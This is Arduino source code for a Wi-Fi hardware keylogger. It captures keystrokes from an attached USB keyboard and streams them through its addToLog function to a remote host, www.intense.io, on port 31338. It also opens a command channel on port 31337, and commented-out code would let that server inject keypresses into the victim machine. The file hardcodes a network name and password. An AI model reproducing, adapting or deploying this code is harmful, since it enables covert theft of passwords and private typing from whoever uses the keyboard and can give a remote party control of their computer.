#include <SPI.h>
#include <Adafruit_WINC1500.h>
#include "CircularBuffer.h"
#include "KeyboardHandler.h"
#include "keylogger.h"

// Define the WINC1500 board connections below.
// If you're following the Adafruit WINC1500 board
// guide you don't need to modify these:
#define WINC_CS   8
#define WINC_IRQ  7
#define WINC_RST  4
#define WINC_EN   2     // or, tie EN to VCC and comment this out
// The SPI pins of the WINC1500 (SCK, MOSI, MISO) should be
// connected to the hardware SPI port of the Arduino.
// On an Uno or compatible these are SCK = #13, MISO = #12, MOSI = #11.
// On an Arduino Zero use the 6-pin ICSP header, see:
//   https://www.arduino.cc/en/Reference/SPI

// Setup the WINC1500 connection with the pins above and the default hardware SPI.
Adafruit_WINC1500 WiFi(WINC_CS, WINC_IRQ, WINC_RST);

// Or just use hardware SPI (SCK/MOSI/MISO) and defaults, SS -> #10, INT -> #7, RST -> #5, EN -> 3-5V
//Adafruit_WINC1500 WiFi;

#define STAT_LED 13
char ssid[] = "IllinoisNet_Devices";     //  your network SSID (name)
char pass[] = "Illinois";    // your network password (use for WPA, or use as key for WEP)
int keyIndex = 0;                // your network key Index number (needed only for WEP)

// IPAddress host(104,131,69,59);
char host[] = "www.intense.io";
int port = 31337;
char *debughost = host;
int debugport = 31338;

// Initialize the Ethernet client library
// with the IP address and port of the server
// that you want to connect to (port 80 is default for HTTP):
Adafruit_WINC1500Client client;
Adafruit_WINC1500Client debug;
KeyboardHandler handler;
CircularBuffer<char> logBuffer;

uint32_t last_connect_attempt;
uint32_t last_transfer_attempt;
bool connect_in_progress;

uint16_t max_transfer_time = 50;
uint8_t command_buffer[128];

void addToLog(char *output);

inline bool isConnected() {
  return WiFi.status() == WL_CONNECTED && client.connected();
}

void halt() {
  while(true) {
    digitalWrite(STAT_LED, HIGH);
    delay(100);
    digitalWrite(STAT_LED, LOW);
    delay(100);
  }
}

void setup() {

  #ifdef WINC_EN
  pinMode(WINC_EN, OUTPUT);
  digitalWrite(WINC_EN, HIGH);
  #endif

  pinMode(STAT_LED, OUTPUT);
  digitalWrite(STAT_LED, HIGH);

  // Halt if no WiFi hardware installed
  if(WiFi.status() == WL_NO_SHIELD) {
    halt();
  }

  handler.setLogCallback(&addToLog);
  handler.init();

  // Begin serial communications with USB keyboard emulator
  Serial1.begin(9600);

  // Assumes WPA/WPA2 network, attempt to connect
  last_connect_attempt = millis();
  connect_in_progress = true;
  WiFi.begin(ssid, pass);

  /*
  // attempt to connect to Wifi network:
  while (WiFi.status() != WL_CONNECTED) {
    Serial.print("Attempting to connect to SSID: ");
    Serial.println(ssid);
    // Connect to WPA/WPA2 network. Change this line if using open or WEP network:
    status = WiFi.begin(ssid, pass);

    // wait 10 seconds for connection:
    uint8_t timeout = 10;
    while (timeout && (WiFi.status() != WL_CONNECTED)) {
      timeout--;
      delay(1000);
    }
  }

  Serial.println("Connected to wifi");
  printWifiStatus();

  Serial.println("\nStarting connection to server...");
  // if you get a connection, report back via serial:
  if (client.connect(server, 80)) {
    Serial.println("connected to server");
    // Make a HTTP request:
    client.print("GET ");
    client.print(webpage);
    client.println(" HTTP/1.1");
    client.print("Host: "); client.println(server);
    client.println("Connection: close");
    client.println();
  }
  */
}

void loop() {
  handler.task();
  // Attempt to connect/reconnect if disconnected
  switch(WiFi.status()) {
    case WL_CONNECTED:
      if(connect_in_progress && millis() - last_connect_attempt > 5000) {
        last_connect_attempt = millis();
        if(client.connect(host, port) && debug.connect(debughost, debugport)) {
          connect_in_progress = false;
          digitalWrite(STAT_LED, LOW);
          client.println("Hello");
          printWifiStatus();
        }
      }
      break;
    case WL_IDLE_STATUS:
      if(connect_in_progress && millis() - last_connect_attempt < 10000)
        // waiting for connection timeout, do nothing
        break;
    default:
      digitalWrite(STAT_LED, HIGH);
      last_connect_attempt = millis();
      connect_in_progress = true;
      WiFi.begin(ssid, pass);
  }
  
  last_transfer_attempt = millis();
  /*
  while(isConnected() && logBuffer.getNumEntries() > 0 && millis() - last_transfer_attempt < max_transfer_time) {
      debug.write(logBuffer.removeFirst());
  }
  */
  /*
  while(logBuffer.getNumEntries() > 0) {
    debug.write(logBuffer.removeFirst());
  }
  debug.flush();
  */
  /*
  // handle incoming commands from the server
  while(isConnected() && client.available() > 0 && millis() - last_transfer_attempt < max_transfer_time) {
    uint8_t command = client.read();
    switch(command) {
      case CMD_PRESS:
        Keyboard.press(client.read());
        break;
      case CMD_RELEASE:
        Keyboard.release(client.read());
        break;
    }
  }
  */
}


void printWifiStatus() {
  // print the SSID of the network you're attached to:
  client.print("SSID: ");
  client.println(WiFi.SSID());

  // print your WiFi shield's IP address:
  IPAddress ip = WiFi.localIP();
  client.print("IP Address: ");
  client.println(ip);

  // print the received signal strength:
  long rssi = WiFi.RSSI();
  client.print("signal strength (RSSI):");
  client.print(rssi);
  client.println(" dBm");
}

void keyPressed() {
  handler.pressed();
}

void keyReleased() {
  handler.released();
}

void addToLog(char *output) {
    debug.write(output, strlen(output));
    /*
  for (int i = 0; i < strlen(output); ++i) {
    logBuffer.add(output[i]);
  }
  */
}

